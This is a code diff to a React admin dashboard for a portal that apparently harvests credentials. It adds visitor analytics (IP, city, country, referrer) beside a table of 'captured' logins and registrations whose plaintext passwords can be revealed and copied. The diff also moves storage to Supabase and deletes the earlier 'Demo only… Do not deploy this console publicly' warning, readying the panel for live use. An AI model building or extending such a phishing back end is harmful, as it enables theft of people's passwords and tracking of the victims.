@@ -2,7 +2,7 @@
 
 import { useCallback, useEffect, useMemo, useState } from "react";
 
-import type { PortalEvent } from "@/types/portal";
+import type { PortalEvent, PortalStats } from "@/types/portal";
 
 const REFRESH_MS = 4000;
 
@@ -126,6 +126,261 @@ function StatCard({ label, value, hint }: { label: string; value: string; hint?:
   );
 }
 
+const PAGE_LABELS: Record<string, string> = {
+  home: "Home",
+  login: "Login",
+  signup: "Register",
+  other: "Other",
+};
+
+function countryFlag(code: string) {
+  if (!/^[A-Z]{2}$/.test(code)) return "🌐";
+  return String.fromCodePoint(...[...code].map((char) => 127397 + char.charCodeAt(0)));
+}
+
+function countryName(code: string) {
+  if (!code) return "Unknown";
+  try {
+    return new Intl.DisplayNames(["en"], { type: "region" }).of(code) ?? code;
+  } catch {
+    return code;
+  }
+}
+
+function Bar({ value, max, tone }: { value: number; max: number; tone: string }) {
+  const width = max > 0 ? Math.max(2, Math.round((value / max) * 100)) : 0;
+  return (
+    <div className="h-1.5 w-full overflow-hidden rounded-full bg-white/10">
+      <div className={`h-full rounded-full ${tone}`} style={{ width: `${width}%` }} />
+    </div>
+  );
+}
+
+function TrafficPanel({ stats }: { stats: PortalStats }) {
+  const maxPage = Math.max(1, ...stats.byPage.map((page) => page.visits));
+  const maxDaily = Math.max(1, ...stats.daily.map((day) => day.visits));
+  const maxCountry = Math.max(
+    1,
+    ...stats.byCountry.map((country) => country.visits + country.logins + country.signups),
+  );
+  const conversion =
+    stats.totals.visits > 0
+      ? ((stats.totals.logins + stats.totals.signups) / stats.totals.visits) * 100
+      : 0;
+
+  return (
+    <section className="mt-8">
+      <div className="flex flex-wrap items-end justify-between gap-2">
+        <div>
+          <h2 className="text-lg font-semibold text-white">Traffic</h2>
+          <p className="text-xs text-neutral-500">
+            Page views and conversions from the last 14 days · updated{" "}
+            {new Date(stats.generatedAt).toLocaleTimeString("en-GB")}
+          </p>
+        </div>
+        <p className="text-xs text-neutral-500">
+          Conversion to a form submit:{" "}
+          <span className="font-semibold text-[#c9f95a]">{conversion.toFixed(1)}%</span>
+        </p>
+      </div>
+
+      <div className="mt-4 grid gap-4 sm:grid-cols-2 lg:grid-cols-4">
+        <StatCard
+          label="Visits (7d)"
+          value={String(stats.totals.visitsWeek)}
+          hint={`${stats.totals.visits} all time`}
+        />
+        <StatCard label="Visits today" value={String(stats.totals.visitsToday)} hint="UTC day" />
+        <StatCard
+          label="Unique visitors"
+          value={String(stats.totals.uniqueVisitors)}
+          hint="Per browser, best effort"
+        />
+        <StatCard
+          label="Conversions"
+          value={String(stats.totals.logins + stats.totals.signups)}
+          hint={`${stats.totals.logins} logins · ${stats.totals.signups} signups`}
+        />
+      </div>
+
+      <div className="mt-4 grid gap-4 lg:grid-cols-2">
+        <div className="rounded-2xl border border-white/10 bg-white/[0.02] p-5">
+          <h3 className="text-sm font-semibold text-white">Where they land</h3>
+          <div className="mt-4 space-y-3">
+            {stats.byPage.length === 0 ? (
+              <p className="text-xs text-neutral-500">No page views recorded yet.</p>
+            ) : (
+              stats.byPage.map((page) => (
+                <div key={page.page}>
+                  <div className="flex items-baseline justify-between text-xs">
+                    <span className="text-neutral-300">{PAGE_LABELS[page.page] ?? page.page}</span>
+                    <span className="text-neutral-500">
+                      {page.visits} views · {page.visitors} visitors
+                    </span>
+                  </div>
+                  <div className="mt-1.5">
+                    <Bar value={page.visits} max={maxPage} tone="bg-[#c9f95a]" />
+                  </div>
+                </div>
+              ))
+            )}
+          </div>
+        </div>
+
+        <div className="rounded-2xl border border-white/10 bg-white/[0.02] p-5">
+          <h3 className="text-sm font-semibold text-white">Top countries</h3>
+          <div className="mt-3 overflow-x-auto">
+            <table className="w-full text-left text-xs">
+              <thead>
+                <tr className="text-[10px] uppercase tracking-[0.12em] text-neutral-600">
+                  <th className="pb-2 font-semibold">Country</th>
+                  <th className="pb-2 text-right font-semibold">Views</th>
+                  <th className="pb-2 text-right font-semibold">Logins</th>
+                  <th className="pb-2 text-right font-semibold">Signups</th>
+                </tr>
+              </thead>
+              <tbody>
+                {stats.byCountry.length === 0 ? (
+                  <tr>
+                    <td colSpan={4} className="py-4 text-center text-neutral-500">
+                      No traffic yet.
+                    </td>
+                  </tr>
+                ) : (
+                  stats.byCountry.map((country) => (
+                    <tr key={country.country} className="border-t border-white/5">
+                      <td className="py-2 text-neutral-300">
+                        <span className="mr-2">{countryFlag(country.country)}</span>
+                        {countryName(country.country)}
+                        <span className="ml-1.5 text-[10px] text-neutral-600">
+                          {country.country || "—"}
+                        </span>
+                        <div className="mt-1">
+                          <Bar
+                            value={country.visits + country.logins + country.signups}
+                            max={maxCountry}
+                            tone="bg-sky-400"
+                          />
+                        </div>
+                      </td>
+                      <td className="py-2 text-right text-neutral-300">{country.visits}</td>
+                      <td className="py-2 text-right text-neutral-400">{country.logins}</td>
+                      <td className="py-2 text-right text-neutral-400">{country.signups}</td>
+                    </tr>
+                  ))
+                )}
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+
+      <div className="mt-4 rounded-2xl border border-white/10 bg-white/[0.02] p-5">
+        <div className="flex items-center justify-between">
+          <h3 className="text-sm font-semibold text-white">Last 14 days</h3>
+          <div className="flex items-center gap-3 text-[10px] uppercase tracking-wide text-neutral-500">
+            <span className="flex items-center gap-1">
+              <span className="h-2 w-2 rounded-sm bg-[#c9f95a]" /> views
+            </span>
+            <span className="flex items-center gap-1">
+              <span className="h-2 w-2 rounded-sm bg-sky-400" /> logins
+            </span>
+            <span className="flex items-center gap-1">
+              <span className="h-2 w-2 rounded-sm bg-fuchsia-400" /> signups
+            </span>
+          </div>
+        </div>
+        <div className="mt-4 flex h-32 items-end gap-1.5">
+          {stats.daily.map((day) => {
+            const total = day.logins + day.signups;
+            const height = Math.max(3, Math.round((day.visits / maxDaily) * 100));
+            return (
+              <div key={day.date} className="group relative flex-1">
+                <div className="flex h-32 flex-col justify-end">
+                  <div
+                    className="w-full rounded-t bg-[#c9f95a]/80 transition group-hover:bg-[#c9f95a]"
+                    style={{ height: `${height}%` }}
+                  />
+                  {total > 0 ? (
+                    <div className="mt-0.5 flex gap-0.5">
+                      <div
+                        className="flex-1 rounded-t bg-sky-400"
+                        style={{ height: Math.max(2, day.logins * 3) }}
+                      />
+                      <div
+                        className="flex-1 rounded-t bg-fuchsia-400"
+                        style={{ height: Math.max(2, day.signups * 3) }}
+                      />
+                    </div>
+                  ) : null}
+                </div>
+                <div className="pointer-events-none absolute -top-8 left-1/2 z-10 hidden -translate-x-1/2 whitespace-nowrap rounded bg-black/90 px-2 py-1 text-[10px] text-neutral-200 group-hover:block">
+                  {day.date} · {day.visits} views · {day.logins}L / {day.signups}S
+                </div>
+                <p className="mt-1 text-center text-[9px] text-neutral-600">{day.date.slice(5)}</p>
+              </div>
+            );
+          })}
+        </div>
+      </div>
+
+      <div className="mt-4 overflow-hidden rounded-2xl border border-white/10 bg-white/[0.02]">
+        <div className="border-b border-white/10 px-5 py-3">
+          <h3 className="text-sm font-semibold text-white">Latest visits</h3>
+        </div>
+        <div className="overflow-x-auto">
+          <table className="w-full min-w-[720px] text-left text-xs">
+            <thead>
+              <tr className="border-b border-white/5 text-[10px] uppercase tracking-[0.12em] text-neutral-600">
+                <th className="px-4 py-2 font-semibold">When</th>
+                <th className="px-4 py-2 font-semibold">Page</th>
+                <th className="px-4 py-2 font-semibold">Country</th>
+                <th className="px-4 py-2 font-semibold">City</th>
+                <th className="px-4 py-2 font-semibold">Referrer</th>
+                <th className="px-4 py-2 font-semibold">IP</th>
+              </tr>
+            </thead>
+            <tbody>
+              {stats.recentVisits.length === 0 ? (
+                <tr>
+                  <td colSpan={6} className="px-4 py-8 text-center text-neutral-500">
+                    No visits recorded yet — open <code className="text-[#c9f95a]">/login</code> in
+                    another tab to see it here.
+                  </td>
+                </tr>
+              ) : (
+                stats.recentVisits.map((visit) => (
+                  <tr key={visit.id} className="border-b border-white/5 last:border-0">
+                    <td className="whitespace-nowrap px-4 py-2 text-neutral-400">
+                      {formatTime(visit.at)}
+                    </td>
+                    <td className="px-4 py-2">
+                      <span className="rounded-full bg-white/[0.06] px-2 py-0.5 text-[10px] font-semibold uppercase tracking-wide text-neutral-300">
+                        {PAGE_LABELS[visit.page] ?? visit.page}
+                      </span>
+                      <span className="ml-2 text-[10px] text-neutral-600">{visit.path}</span>
+                    </td>
+                    <td className="whitespace-nowrap px-4 py-2 text-neutral-300">
+                      {visit.country ? `${countryFlag(visit.country)} ${visit.country}` : "—"}
+                    </td>
+                    <td className="px-4 py-2 text-neutral-500">{visit.city || "—"}</td>
+                    <td className="max-w-[220px] truncate px-4 py-2 text-neutral-500">
+                      {visit.referrer || "direct"}
+                    </td>
+                    <td className="whitespace-nowrap px-4 py-2 font-mono text-[10px] text-neutral-600">
+                      {visit.ip}
+                    </td>
+                  </tr>
+                ))
+              )}
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+  );
+}
+
 function PasswordCell({ id, value }: { id: string; value: string }) {
   const [shown, setShown] = useState(false);
   const [copied, setCopied] = useState(false);
@@ -168,6 +423,7 @@ function PasswordCell({ id, value }: { id: string; value: string }) {
 
 export function AdminDashboard() {
   const [events, setEvents] = useState<PortalEvent[]>([]);
+  const [stats, setStats] = useState<PortalStats | null>(null);
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState<string | null>(null);
   const [tab, setTab] = useState<"all" | "login" | "signup">("all");
@@ -176,14 +432,23 @@ export function AdminDashboard() {
 
   const load = useCallback(async () => {
     try {
-      const response = await fetch("/api/admin/submissions", { cache: "no-store" });
-      if (response.status === 401) {
+      const [eventsResponse, statsResponse] = await Promise.all([
+        fetch("/api/admin/submissions", { cache: "no-store" }),
+        fetch("/api/admin/stats", { cache: "no-store" }),
+      ]);
+      if (eventsResponse.status === 401) {
         window.location.href = "/admin/login";
         return;
       }
-      if (!response.ok) throw new Error("request failed");
-      const payload = (await response.json()) as { events?: PortalEvent[] };
+      if (!eventsResponse.ok) throw new Error("request failed");
+      const payload = (await eventsResponse.json()) as { events?: PortalEvent[] };
       setEvents(payload.events ?? []);
+
+      if (statsResponse.ok) {
+        const statsPayload = (await statsResponse.json()) as { stats?: PortalStats };
+        setStats(statsPayload.stats ?? null);
+      }
+
       setLastSync(new Date());
       setError(null);
     } catch {
@@ -309,7 +574,21 @@ export function AdminDashboard() {
       </header>
 
       <main className="mx-auto max-w-[1200px] px-6 py-8">
-        <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-4">
+        {stats ? <TrafficPanel stats={stats} /> : null}
+
+        <div className="mt-10 flex flex-wrap items-end justify-between gap-2">
+          <div>
+            <h2 className="text-lg font-semibold text-white">Captured submissions</h2>
+            <p className="text-xs text-neutral-500">Logins and registrations submitted on the portal</p>
+          </div>
+          {lastEvent ? (
+            <p className="text-xs text-neutral-500">
+              Last activity {relativeTime(lastEvent.at)} · {formatTime(lastEvent.at)}
+            </p>
+          ) : null}
+        </div>
+
+        <div className="mt-4 grid gap-4 sm:grid-cols-2 lg:grid-cols-4">
           <StatCard label="Logins" value={String(logins.length)} hint="Captured sign-in attempts" />
           <StatCard
             label="Registrations"
@@ -477,9 +756,10 @@ export function AdminDashboard() {
         </div>
 
         <p className="mt-4 text-[11px] leading-5 text-neutral-600">
-          Demo only — submissions are written unencrypted to{" "}
-          <code className="rounded bg-white/[0.06] px-1 py-0.5">.data/portal-events.json</code> on
-          this machine. Do not deploy this console publicly.
+          Submissions land in Supabase (<code className="rounded bg-white/[0.06] px-1 py-0.5">portal_events</code>)
+          and page views in <code className="rounded bg-white/[0.06] px-1 py-0.5">portal_visits</code>.
+          Locally, without Supabase credentials, both fall back to files under{" "}
+          <code className="rounded bg-white/[0.06] px-1 py-0.5">.data/</code>.
         </p>
       </main>
     </div>
